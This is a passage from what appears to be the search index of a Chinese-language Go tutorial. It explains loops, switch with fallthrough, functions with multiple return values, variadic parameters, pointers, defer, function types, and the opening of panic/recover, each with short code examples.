{\nsum += index\n}\nfmt.Println(\"sum is equal to \", sum)\n}\n// \u8f93\u51fa\uff1asum is equal to 45\n</code></pre> \u6709\u4e9b\u65f6\u5019\u9700\u8981\u8fdb\u884c\u591a\u4e2a\u8d4b\u503c\u64cd\u4f5c\uff0c\u7531\u4e8eGo\u91cc\u9762\u6ca1\u6709<code>,</code>\u64cd\u4f5c\u7b26\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u5e73\u884c\u8d4b\u503c<code>i, j = i+1, j-1</code></p> <p>\u6709\u4e9b\u65f6\u5019\u5982\u679c\u6211\u4eec\u5ffd\u7565<code>expression1</code>\u548c<code>expression3</code>\uff1a <pre><code>sum := 1\nfor ; sum &lt; 1000;  {\nsum += sum\n}\n</code></pre> \u5176\u4e2d<code>;</code>\u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u90a3\u4e48\u5c31\u53d8\u6210\u5982\u4e0b\u7684\u4ee3\u7801\u4e86\uff0c\u662f\u4e0d\u662f\u4f3c\u66fe\u76f8\u8bc6\uff1f\u5bf9\uff0c\u8fd9\u5c31\u662f<code>while</code>\u7684\u529f\u80fd\u3002 <pre><code>sum := 1\nfor sum &lt; 1000 {\nsum += sum\n}\n</code></pre> \u5728\u5faa\u73af\u91cc\u9762\u6709\u4e24\u4e2a\u5173\u952e\u64cd\u4f5c<code>break</code>\u548c<code>continue</code>  ,<code>break</code>\u64cd\u4f5c\u662f\u8df3\u51fa\u5f53\u524d\u5faa\u73af\uff0c<code>continue</code>\u662f\u8df3\u8fc7\u672c\u6b21\u5faa\u73af\u3002\u5f53\u5d4c\u5957\u8fc7\u6df1\u7684\u65f6\u5019\uff0c<code>break</code>\u53ef\u4ee5\u914d\u5408\u6807\u7b7e\u4f7f\u7528\uff0c\u5373\u8df3\u8f6c\u81f3\u6807\u7b7e\u6240\u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u8be6\u7ec6\u53c2\u8003\u5982\u4e0b\u4f8b\u5b50\uff1a <pre><code>for index := 10; index&gt;0; index-- {\nif index == 5{\nbreak // \u6216\u8005continue\n}\nfmt.Println(index)\n}\n// break\u6253\u5370\u51fa\u676510\u30019\u30018\u30017\u30016\n// continue\u6253\u5370\u51fa\u676510\u30019\u30018\u30017\u30016\u30014\u30013\u30012\u30011\n</code></pre> <code>break</code>\u548c<code>continue</code>\u8fd8\u53ef\u4ee5\u8ddf\u7740\u6807\u53f7\uff0c\u7528\u6765\u8df3\u5230\u591a\u91cd\u5faa\u73af\u4e2d\u7684\u5916\u5c42\u5faa\u73af</p> <p><code>for</code>\u914d\u5408<code>range</code>\u53ef\u4ee5\u7528\u4e8e\u8bfb\u53d6<code>slice</code>\u548c<code>map</code>\u7684\u6570\u636e\uff1a <pre><code>for k,v:=range map {\nfmt.Println(\"map's key:\",k)\nfmt.Println(\"map's val:\",v)\n}\n</code></pre> \u7531\u4e8e Go \u652f\u6301 \u201c\u591a\u503c\u8fd4\u56de\u201d, \u800c\u5bf9\u4e8e\u201c\u58f0\u660e\u800c\u672a\u88ab\u8c03\u7528\u201d\u7684\u53d8\u91cf, \u7f16\u8bd1\u5668\u4f1a\u62a5\u9519, \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b, \u53ef\u4ee5\u4f7f\u7528<code>_</code>\u6765\u4e22\u5f03\u4e0d\u9700\u8981\u7684\u8fd4\u56de\u503c \u4f8b\u5982 <pre><code>for _, v := range map{\nfmt.Println(\"map's val:\", v)\n}\n</code></pre></p>"},{"location":"02.3/#switch","title":"switch","text":"<p>\u6709\u4e9b\u65f6\u5019\u4f60\u9700\u8981\u5199\u5f88\u591a\u7684<code>if-else</code>\u6765\u5b9e\u73b0\u4e00\u4e9b\u903b\u8f91\u5904\u7406\uff0c\u8fd9\u4e2a\u65f6\u5019\u4ee3\u7801\u770b\u4e0a\u53bb\u5c31\u5f88\u4e11\u5f88\u5197\u957f\uff0c\u800c\u4e14\u4e5f\u4e0d\u6613\u4e8e\u4ee5\u540e\u7684\u7ef4\u62a4\uff0c\u8fd9\u4e2a\u65f6\u5019<code>switch</code>\u5c31\u80fd\u5f88\u597d\u7684\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b <pre><code>switch sExpr {\ncase expr1:\nsome instructions\ncase expr2:\nsome other instructions\ncase expr3:\nsome other instructions\ndefault:\nother code\n}\n</code></pre> <code>sExpr</code>\u548c<code>expr1</code>\u3001<code>expr2</code>\u3001<code>expr3</code>\u7684\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4\u3002Go\u7684<code>switch</code>\u975e\u5e38\u7075\u6d3b\uff0c\u8868\u8fbe\u5f0f\u4e0d\u5fc5\u662f\u5e38\u91cf\u6216\u6574\u6570\uff0c\u6267\u884c\u7684\u8fc7\u7a0b\u4ece\u4e0a\u81f3\u4e0b\uff0c\u76f4\u5230\u627e\u5230\u5339\u914d\u9879\uff1b\u800c\u5982\u679c<code>switch</code>\u6ca1\u6709\u8868\u8fbe\u5f0f\uff0c\u5b83\u4f1a\u5339\u914d<code>true</code>\u3002 <pre><code>i := 10\nswitch i {\ncase 1:\nfmt.Println(\"i is equal to 1\")\ncase 2, 3, 4:\nfmt.Println(\"i is equal to 2, 3 or 4\")\ncase 10:\nfmt.Println(\"i is equal to 10\")\ndefault:\nfmt.Println(\"All I know is that i is an integer\")\n}\n</code></pre> \u5728\u7b2c5\u884c\u4e2d\uff0c\u6211\u4eec\u628a\u5f88\u591a\u503c\u805a\u5408\u5728\u4e86\u4e00\u4e2a<code>case</code>\u91cc\u9762\uff0c\u540c\u65f6\uff0cGo\u91cc\u9762<code>switch</code>\u9ed8\u8ba4\u76f8\u5f53\u4e8e\u6bcf\u4e2a<code>case</code>\u6700\u540e\u5e26\u6709<code>break</code>\uff0c\u5339\u914d\u6210\u529f\u540e\u4e0d\u4f1a\u81ea\u52a8\u5411\u4e0b\u6267\u884c\u5176\u4ed6case\uff0c\u800c\u662f\u8df3\u51fa\u6574\u4e2a<code>switch</code>, \u4f46\u662f\u53ef\u4ee5\u4f7f\u7528<code>fallthrough</code>\u5f3a\u5236\u6267\u884c\u540e\u9762\u7684case\u4ee3\u7801\u3002 <pre><code>integer := 6\nswitch integer {\ncase 4:\nfmt.Println(\"The integer was &lt;= 4\")\nfallthrough\ncase 5:\nfmt.Println(\"The integer was &lt;= 5\")\nfallthrough\ncase 6:\nfmt.Println(\"The integer was &lt;= 6\")\nfallthrough\ncase 7:\nfmt.Println(\"The integer was &lt;= 7\")\nfallthrough\ncase 8:\nfmt.Println(\"The integer was &lt;= 8\")\nfallthrough\ndefault:\nfmt.Println(\"default case\")\n}\n</code></pre> \u4e0a\u9762\u7684\u7a0b\u5e8f\u5c06\u8f93\u51fa <pre><code>The integer was &lt;= 6\nThe integer was &lt;= 7\nThe integer was &lt;= 8\ndefault case\n</code></pre></p>"},{"location":"02.3/#_2","title":"\u51fd\u6570","text":"<p>\u51fd\u6570\u662fGo\u91cc\u9762\u7684\u6838\u5fc3\u8bbe\u8ba1\uff0c\u5b83\u901a\u8fc7\u5173\u952e\u5b57<code>func</code>\u6765\u58f0\u660e\uff0c\u5b83\u7684\u683c\u5f0f\u5982\u4e0b\uff1a <pre><code>func funcName(input1 type1, input2 type2) (output1 type1, output2 type2) {\n//\u8fd9\u91cc\u662f\u5904\u7406\u903b\u8f91\u4ee3\u7801\n//\u8fd4\u56de\u591a\u4e2a\u503c\nreturn value1, value2\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u770b\u51fa</p> <ul> <li>\u5173\u952e\u5b57<code>func</code>\u7528\u6765\u58f0\u660e\u4e00\u4e2a\u51fd\u6570<code>funcName</code></li> <li>\u51fd\u6570\u53ef\u4ee5\u6709\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53c2\u6570\uff0c\u6bcf\u4e2a\u53c2\u6570\u540e\u9762\u5e26\u6709\u7c7b\u578b\uff0c\u901a\u8fc7<code>,</code>\u5206\u9694</li> <li>\u51fd\u6570\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c</li> <li>\u4e0a\u9762\u8fd4\u56de\u503c\u58f0\u660e\u4e86\u4e24\u4e2a\u53d8\u91cf<code>output1</code>\u548c<code>output2</code>\uff0c\u5982\u679c\u4f60\u4e0d\u60f3\u58f0\u660e\u4e5f\u53ef\u4ee5\uff0c\u76f4\u63a5\u5c31\u4e24\u4e2a\u7c7b\u578b</li> <li>\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u8fd4\u56de\u503c\u4e14\u4e0d\u58f0\u660e\u8fd4\u56de\u503c\u53d8\u91cf\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u7701\u7565 \u5305\u62ec\u8fd4\u56de\u503c \u7684\u62ec\u53f7</li> <li>\u5982\u679c\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u7701\u7565\u6700\u540e\u7684\u8fd4\u56de\u4fe1\u606f</li> <li>\u5982\u679c\u6709\u8fd4\u56de\u503c\uff0c \u90a3\u4e48\u5fc5\u987b\u5728\u51fd\u6570\u7684\u5916\u5c42\u6dfb\u52a0return\u8bed\u53e5</li> </ul> <p>\u4e0b\u9762\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u5b9e\u9645\u5e94\u7528\u51fd\u6570\u7684\u4f8b\u5b50\uff08\u7528\u6765\u8ba1\u7b97Max\u503c\uff09 <pre><code>package main\n\nimport \"fmt\"\n\n// \u8fd4\u56dea\u3001b\u4e2d\u6700\u5927\u503c.\nfunc max(a, b int) int {\nif a &gt; b {\nreturn a\n}\nreturn b\n}\n\nfunc main() {\nx := 3\ny := 4\nz := 5\n\nmax_xy := max(x, y) //\u8c03\u7528\u51fd\u6570max(x, y)\nmax_xz := max(x, z) //\u8c03\u7528\u51fd\u6570max(x, z)\n\nfmt.Printf(\"max(%d, %d) = %d\\n\", x, y, max_xy)\nfmt.Printf(\"max(%d, %d) = %d\\n\", x, z, max_xz)\nfmt.Printf(\"max(%d, %d) = %d\\n\", y, z, max(y,z)) // \u4e5f\u53ef\u5728\u8fd9\u76f4\u63a5\u8c03\u7528\u5b83\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e2a\u91cc\u9762\u6211\u4eec\u53ef\u4ee5\u770b\u5230<code>max</code>\u51fd\u6570\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u7c7b\u578b\u90fd\u662f<code>int</code>\uff0c\u90a3\u4e48\u7b2c\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\u53ef\u4ee5\u7701\u7565\uff08\u5373 a,b int,\u800c\u975e a int, b int)\uff0c\u9ed8\u8ba4\u4e3a\u79bb\u5b83\u6700\u8fd1\u7684\u7c7b\u578b\uff0c\u540c\u7406\u591a\u4e8e2\u4e2a\u540c\u7c7b\u578b\u7684\u53d8\u91cf\u6216\u8005\u8fd4\u56de\u503c\u3002\u540c\u65f6\u6211\u4eec\u6ce8\u610f\u5230\u5b83\u7684\u8fd4\u56de\u503c\u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\uff0c\u8fd9\u4e2a\u5c31\u662f\u7701\u7565\u5199\u6cd5\u3002</p>"},{"location":"02.3/#_3","title":"\u591a\u4e2a\u8fd4\u56de\u503c","text":"<p>Go\u8bed\u8a00\u6bd4C\u66f4\u5148\u8fdb\u7684\u7279\u6027\uff0c\u5176\u4e2d\u4e00\u70b9\u5c31\u662f\u51fd\u6570\u80fd\u591f\u8fd4\u56de\u591a\u4e2a\u503c\u3002</p> <p>\u6211\u4eec\u76f4\u63a5\u4e0a\u4ee3\u7801\u770b\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\n//\u8fd4\u56de A+B \u548c A*B\nfunc SumAndProduct(A, B int) (int, int) {\nreturn A+B, A*B\n}\n\nfunc main() {\nx := 3\ny := 4\n\nxPLUSy, xTIMESy := SumAndProduct(x, y)\n\nfmt.Printf(\"%d + %d = %d\\n\", x, y, xPLUSy)\nfmt.Printf(\"%d * %d = %d\\n\", x, y, xTIMESy)\n}\n</code></pre> \u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u76f4\u63a5\u8fd4\u56de\u4e86\u4e24\u4e2a\u53c2\u6570\uff0c\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u547d\u540d\u8fd4\u56de\u53c2\u6570\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u91cc\u9762\u53ea\u662f\u7528\u4e86\u4e24\u4e2a\u7c7b\u578b\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6539\u6210\u5982\u4e0b\u8fd9\u6837\u7684\u5b9a\u4e49\uff0c\u7136\u540e\u8fd4\u56de\u7684\u65f6\u5019\u4e0d\u7528\u5e26\u4e0a\u53d8\u91cf\u540d\uff0c\u56e0\u4e3a\u76f4\u63a5\u5728\u51fd\u6570\u91cc\u9762\u521d\u59cb\u5316\u4e86\u3002\u4f46\u5982\u679c\u4f60\u7684\u51fd\u6570\u662f\u5bfc\u51fa\u7684(\u9996\u5b57\u6bcd\u5927\u5199)\uff0c\u5b98\u65b9\u5efa\u8bae\uff1a\u6700\u597d\u547d\u540d\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u4e0d\u547d\u540d\u8fd4\u56de\u503c\uff0c\u867d\u7136\u4f7f\u5f97\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\u4e86\uff0c\u4f46\u662f\u4f1a\u9020\u6210\u751f\u6210\u7684\u6587\u6863\u53ef\u8bfb\u6027\u5dee\u3002 <pre><code>func SumAndProduct(A, B int) (add int, Multiplied int) {\nadd = A+B\nMultiplied = A*B\nreturn\n}\n</code></pre></p>"},{"location":"02.3/#_4","title":"\u53d8\u53c2","text":"<p>Go\u51fd\u6570\u652f\u6301\u53d8\u53c2\u3002\u63a5\u53d7\u53d8\u53c2\u7684\u51fd\u6570\u662f\u6709\u7740\u4e0d\u5b9a\u6570\u91cf\u7684\u53c2\u6570\u7684\u3002\u4e3a\u4e86\u505a\u5230\u8fd9\u70b9\uff0c\u9996\u5148\u9700\u8981\u5b9a\u4e49\u51fd\u6570\u4f7f\u5176\u63a5\u53d7\u53d8\u53c2\uff1a <pre><code>func myfunc(arg ...int) {}\n</code></pre> <code>arg ...int</code>\u544a\u8bc9Go\u8fd9\u4e2a\u51fd\u6570\u63a5\u53d7\u4e0d\u5b9a\u6570\u91cf\u7684\u53c2\u6570\u3002\u6ce8\u610f\uff0c\u8fd9\u4e9b\u53c2\u6570\u7684\u7c7b\u578b\u5168\u90e8\u662f<code>int</code>\u3002\u5728\u51fd\u6570\u4f53\u4e2d\uff0c\u53d8\u91cf<code>arg</code>\u662f\u4e00\u4e2a<code>int</code>\u7684<code>slice</code>\uff1a <pre><code>for _, n := range arg {\nfmt.Printf(\"And the number is: %d\\n\", n)\n}\n</code></pre></p>"},{"location":"02.3/#_5","title":"\u4f20\u503c\u4e0e\u4f20\u6307\u9488","text":"<p>\u5f53\u6211\u4eec\u4f20\u4e00\u4e2a\u53c2\u6570\u503c\u5230\u88ab\u8c03\u7528\u51fd\u6570\u91cc\u9762\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u4f20\u4e86\u8fd9\u4e2a\u503c\u7684\u4e00\u4efdcopy\uff0c\u5f53\u5728\u88ab\u8c03\u7528\u51fd\u6570\u4e2d\u4fee\u6539\u53c2\u6570\u503c\u7684\u65f6\u5019\uff0c\u8c03\u7528\u51fd\u6570\u4e2d\u76f8\u5e94\u5b9e\u53c2\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u53d8\u5316\uff0c\u56e0\u4e3a\u6570\u503c\u53d8\u5316\u53ea\u4f5c\u7528\u5728copy\u4e0a\u3002</p> <p>\u4e3a\u4e86\u9a8c\u8bc1\u6211\u4eec\u4e0a\u9762\u7684\u8bf4\u6cd5\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\n//\u7b80\u5355\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u5b9e\u73b0\u4e86\u53c2\u6570+1\u7684\u64cd\u4f5c\nfunc add1(a int) int {\na = a+1 // \u6211\u4eec\u6539\u53d8\u4e86a\u7684\u503c\nreturn a //\u8fd4\u56de\u4e00\u4e2a\u65b0\u503c\n}\n\nfunc main() {\nx := 3\n\nfmt.Println(\"x = \", x)  // \u5e94\u8be5\u8f93\u51fa \"x = 3\"\n\nx1 := add1(x)  //\u8c03\u7528add1(x)\n\nfmt.Println(\"x+1 = \", x1) // \u5e94\u8be5\u8f93\u51fa\"x+1 = 4\"\nfmt.Println(\"x = \", x)    // \u5e94\u8be5\u8f93\u51fa\"x = 3\"\n}\n</code></pre> \u770b\u5230\u4e86\u5417\uff1f\u867d\u7136\u6211\u4eec\u8c03\u7528\u4e86<code>add1</code>\u51fd\u6570\uff0c\u5e76\u4e14\u5728<code>add1</code>\u4e2d\u6267\u884c<code>a = a+1</code>\u64cd\u4f5c\uff0c\u4f46\u662f\u4e0a\u9762\u4f8b\u5b50\u4e2d<code>x</code>\u53d8\u91cf\u7684\u503c\u6ca1\u6709\u53d1\u751f\u53d8\u5316</p> <p>\u7406\u7531\u5f88\u7b80\u5355\uff1a\u56e0\u4e3a\u5f53\u6211\u4eec\u8c03\u7528<code>add1</code>\u7684\u65f6\u5019\uff0c<code>add1</code>\u63a5\u6536\u7684\u53c2\u6570\u5176\u5b9e\u662f<code>x</code>\u7684copy\uff0c\u800c\u4e0d\u662f<code>x</code>\u672c\u8eab\u3002</p> <p>\u90a3\u4f60\u4e5f\u8bb8\u4f1a\u95ee\u4e86\uff0c\u5982\u679c\u771f\u7684\u9700\u8981\u4f20\u8fd9\u4e2a<code>x</code>\u672c\u8eab,\u8be5\u600e\u4e48\u529e\u5462\uff1f</p> <p>\u8fd9\u5c31\u7275\u626f\u5230\u4e86\u6240\u8c13\u7684\u6307\u9488\u3002\u6211\u4eec\u77e5\u9053\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u662f\u5b58\u653e\u4e8e\u4e00\u5b9a\u5730\u5740\u4e0a\u7684\uff0c\u4fee\u6539\u53d8\u91cf\u5b9e\u9645\u662f\u4fee\u6539\u53d8\u91cf\u5730\u5740\u5904\u7684\u5185\u5b58\u3002\u53ea\u6709<code>add1</code>\u51fd\u6570\u77e5\u9053<code>x</code>\u53d8\u91cf\u6240\u5728\u7684\u5730\u5740\uff0c\u624d\u80fd\u4fee\u6539<code>x</code>\u53d8\u91cf\u7684\u503c\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06<code>x</code>\u6240\u5728\u5730\u5740<code>&amp;x</code>\u4f20\u5165\u51fd\u6570\uff0c\u5e76\u5c06\u51fd\u6570\u7684\u53c2\u6570\u7684\u7c7b\u578b\u7531<code>int</code>\u6539\u4e3a<code>*int</code>\uff0c\u5373\u6539\u4e3a\u6307\u9488\u7c7b\u578b\uff0c\u624d\u80fd\u5728\u51fd\u6570\u4e2d\u4fee\u6539<code>x</code>\u53d8\u91cf\u7684\u503c\u3002\u6b64\u65f6\u53c2\u6570\u4ecd\u7136\u662f\u6309copy\u4f20\u9012\u7684\uff0c\u53ea\u662fcopy\u7684\u662f\u4e00\u4e2a\u6307\u9488\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\n//\u7b80\u5355\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u5b9e\u73b0\u4e86\u53c2\u6570+1\u7684\u64cd\u4f5c\nfunc add1(a *int) int { // \u8bf7\u6ce8\u610f\uff0c\n*a = *a+1 // \u4fee\u6539\u4e86a\u7684\u503c\nreturn *a // \u8fd4\u56de\u65b0\u503c\n}\n\nfunc main() {\nx := 3\n\nfmt.Println(\"x = \", x)  // \u5e94\u8be5\u8f93\u51fa \"x = 3\"\n\nx1 := add1(&amp;x)  // \u8c03\u7528 add1(&amp;x) \u4f20x\u7684\u5730\u5740\n\nfmt.Println(\"x+1 = \", x1) // \u5e94\u8be5\u8f93\u51fa \"x+1 = 4\"\nfmt.Println(\"x = \", x)    // \u5e94\u8be5\u8f93\u51fa \"x = 4\"\n}\n</code></pre> \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u8fbe\u5230\u4e86\u4fee\u6539<code>x</code>\u7684\u76ee\u7684\u3002\u90a3\u4e48\u5230\u5e95\u4f20\u6307\u9488\u6709\u4ec0\u4e48\u597d\u5904\u5462\uff1f</p> <ul> <li>\u4f20\u6307\u9488\u4f7f\u5f97\u591a\u4e2a\u51fd\u6570\u80fd\u64cd\u4f5c\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002</li> <li>\u4f20\u6307\u9488\u6bd4\u8f83\u8f7b\u91cf\u7ea7 (8bytes),\u53ea\u662f\u4f20\u5185\u5b58\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u6307\u9488\u4f20\u9012\u4f53\u79ef\u5927\u7684\u7ed3\u6784\u4f53\u3002\u5982\u679c\u7528\u53c2\u6570\u503c\u4f20\u9012\u7684\u8bdd, \u5728\u6bcf\u6b21copy\u4e0a\u9762\u5c31\u4f1a\u82b1\u8d39\u76f8\u5bf9\u8f83\u591a\u7684\u7cfb\u7edf\u5f00\u9500\uff08\u5185\u5b58\u548c\u65f6\u95f4\uff09\u3002\u6240\u4ee5\u5f53\u4f60\u8981\u4f20\u9012\u5927\u7684\u7ed3\u6784\u4f53\u7684\u65f6\u5019\uff0c\u7528\u6307\u9488\u662f\u4e00\u4e2a\u660e\u667a\u7684\u9009\u62e9\u3002</li> <li>Go\u8bed\u8a00\u4e2d<code>channel</code>\uff0c<code>slice</code>\uff0c<code>map</code>\u8fd9\u4e09\u79cd\u7c7b\u578b\u7684\u5b9e\u73b0\u673a\u5236\u7c7b\u4f3c\u6307\u9488\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\uff0c\u800c\u4e0d\u7528\u53d6\u5730\u5740\u540e\u4f20\u9012\u6307\u9488\u3002\uff08\u6ce8\uff1a\u82e5\u51fd\u6570\u9700\u6539\u53d8<code>slice</code>\u7684\u957f\u5ea6\uff0c\u5219\u4ecd\u9700\u8981\u53d6\u5730\u5740\u4f20\u9012\u6307\u9488\uff09</li> </ul>"},{"location":"02.3/#defer","title":"defer","text":"<p>Go\u8bed\u8a00\u4e2d\u6709\u79cd\u4e0d\u9519\u7684\u8bbe\u8ba1\uff0c\u5373\u5ef6\u8fdf\uff08defer\uff09\u8bed\u53e5\uff0c\u4f60\u53ef\u4ee5\u5728\u51fd\u6570\u4e2d\u6dfb\u52a0\u591a\u4e2adefer\u8bed\u53e5\u3002\u5f53\u51fd\u6570\u6267\u884c\u5230\u6700\u540e\u65f6\uff0c\u8fd9\u4e9bdefer\u8bed\u53e5\u4f1a\u6309\u7167\u9006\u5e8f\u6267\u884c\uff0c\u6700\u540e\u8be5\u51fd\u6570\u8fd4\u56de\u3002\u7279\u522b\u662f\u5f53\u4f60\u5728\u8fdb\u884c\u4e00\u4e9b\u6253\u5f00\u8d44\u6e90\u7684\u64cd\u4f5c\u65f6\uff0c\u9047\u5230\u9519\u8bef\u9700\u8981\u63d0\u524d\u8fd4\u56de\uff0c\u5728\u8fd4\u56de\u524d\u4f60\u9700\u8981\u5173\u95ed\u76f8\u5e94\u7684\u8d44\u6e90\uff0c\u4e0d\u7136\u5f88\u5bb9\u6613\u9020\u6210\u8d44\u6e90\u6cc4\u9732\u7b49\u95ee\u9898\u3002\u5982\u4e0b\u4ee3\u7801\u6240\u793a\uff0c\u6211\u4eec\u4e00\u822c\u5199\u6253\u5f00\u4e00\u4e2a\u8d44\u6e90\u662f\u8fd9\u6837\u64cd\u4f5c\u7684\uff1a <pre><code>func ReadWrite() bool {\nfile.Open(\"file\")\n// \u505a\u4e00\u4e9b\u5de5\u4f5c\nif failureX {\nfile.Close()\nreturn false\n}\n\nif failureY {\nfile.Close()\nreturn false\n}\n\nfile.Close()\nreturn true\n}\n</code></pre> \u6211\u4eec\u770b\u5230\u4e0a\u9762\u6709\u5f88\u591a\u91cd\u590d\u7684\u4ee3\u7801\uff0cGo\u7684<code>defer</code>\u6709\u6548\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\u4f7f\u7528\u5b83\u540e\uff0c\u4e0d\u4f46\u4ee3\u7801\u91cf\u51cf\u5c11\u4e86\u5f88\u591a\uff0c\u800c\u4e14\u7a0b\u5e8f\u53d8\u5f97\u66f4\u4f18\u96c5\u3002\u5728<code>defer</code>\u540e\u6307\u5b9a\u7684\u51fd\u6570\u4f1a\u5728\u51fd\u6570\u9000\u51fa\u524d\u8c03\u7528\u3002 <pre><code>func ReadWrite() bool {\nfile.Open(\"file\")\ndefer file.Close()\nif failureX {\nreturn false\n}\nif failureY {\nreturn false\n}\nreturn true\n}\n</code></pre> \u5982\u679c\u6709\u5f88\u591a\u8c03\u7528<code>defer</code>\uff0c\u90a3\u4e48<code>defer</code>\u662f\u91c7\u7528\u540e\u8fdb\u5148\u51fa\u6a21\u5f0f\uff0c\u6240\u4ee5\u5982\u4e0b\u4ee3\u7801\u4f1a\u8f93\u51fa<code>4 3 2 1 0</code> <pre><code>for i := 0; i &lt; 5; i++ {\ndefer fmt.Printf(\"%d \", i)\n}\n</code></pre></p>"},{"location":"02.3/#_6","title":"\u51fd\u6570\u4f5c\u4e3a\u503c\u3001\u7c7b\u578b","text":"<p>\u5728Go\u4e2d\u51fd\u6570\u4e5f\u662f\u4e00\u79cd\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>type</code>\u6765\u5b9a\u4e49\u5b83\uff0c\u5b83\u7684\u7c7b\u578b\u5c31\u662f\u6240\u6709\u62e5\u6709\u76f8\u540c\u7684\u53c2\u6570\uff0c\u76f8\u540c\u7684\u8fd4\u56de\u503c\u7684\u4e00\u79cd\u7c7b\u578b</p> <pre><code>type typeName func(input1 inputType1 , input2 inputType2 [, ...]) (result1 resultType1 [, ...])\n</code></pre> <p>\u51fd\u6570\u4f5c\u4e3a\u7c7b\u578b\u5230\u5e95\u6709\u4ec0\u4e48\u597d\u5904\u5462\uff1f\u90a3\u5c31\u662f\u53ef\u4ee5\u628a\u8fd9\u4e2a\u7c7b\u578b\u7684\u51fd\u6570\u5f53\u505a\u503c\u6765\u4f20\u9012\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\ntype testInt func(int) bool // \u58f0\u660e\u4e86\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b\n\nfunc isOdd(integer int) bool {\nif integer%2 == 0 {\nreturn false\n}\nreturn true\n}\n\nfunc isEven(integer int) bool {\nif integer%2 == 0 {\nreturn true\n}\nreturn false\n}\n\n// \u58f0\u660e\u7684\u51fd\u6570\u7c7b\u578b\u5728\u8fd9\u4e2a\u5730\u65b9\u5f53\u505a\u4e86\u4e00\u4e2a\u53c2\u6570\n\nfunc filter(slice []int, f testInt) []int {\nvar result []int\nfor _, value := range slice {\nif f(value) {\nresult = append(result, value)\n}\n}\nreturn result\n}\n\nfunc main(){\nslice := []int {1, 2, 3, 4, 5, 7}\nfmt.Println(\"slice = \", slice)\nodd := filter(slice, isOdd)    // \u51fd\u6570\u5f53\u505a\u503c\u6765\u4f20\u9012\u4e86\nfmt.Println(\"Odd elements of slice are: \", odd)\neven := filter(slice, isEven)  // \u51fd\u6570\u5f53\u505a\u503c\u6765\u4f20\u9012\u4e86\nfmt.Println(\"Even elements of slice are: \", even)\n}\n</code></pre> \u51fd\u6570\u5f53\u505a\u503c\u548c\u7c7b\u578b\u5728\u6211\u4eec\u5199\u4e00\u4e9b\u901a\u7528\u63a5\u53e3\u7684\u65f6\u5019\u975e\u5e38\u6709\u7528\uff0c\u901a\u8fc7\u4e0a\u9762\u4f8b\u5b50\u6211\u4eec\u770b\u5230<code>testInt</code>\u8fd9\u4e2a\u7c7b\u578b\u662f\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b\uff0c\u7136\u540e\u4e24\u4e2a<code>filter</code>\u51fd\u6570\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u4e0e<code>testInt</code>\u7c7b\u578b\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u5f88\u591a\u79cd\u7684\u903b\u8f91\uff0c\u8fd9\u6837\u4f7f\u5f97\u6211\u4eec\u7684\u7a0b\u5e8f\u53d8\u5f97\u975e\u5e38\u7684\u7075\u6d3b\u3002</p>"},{"location":"02.3/#panicrecover","title":"Panic\u548cRecover","text":"<p>Go\u6ca1\u6709\u50cfJava\u90a3\u6837\u7684\u5f02\u5e38\u673a\u5236\uff0c\u5b83\u4e0d\u80fd\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u662f\u4f7f\u7528\u4e86<code>panic</code>\u548c<code>recover</code>\u673a\u5236\u3002\u4e00\u5b9a\u8981\u8bb0\u4f4f\uff0c\u4f60\u5e94\u5f53\u628a\u5b83\u4f5c\u4e3a\u6700\u540e\u7684\u624b\u6bb5\u6765\u4f7f\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u7684\u4ee3\u7801\u4e2d\u5e94\u5f53\u6ca1\u6709\uff0c\u6216\u8005\u5f88\u5c11\u6709<code>panic</code>\u7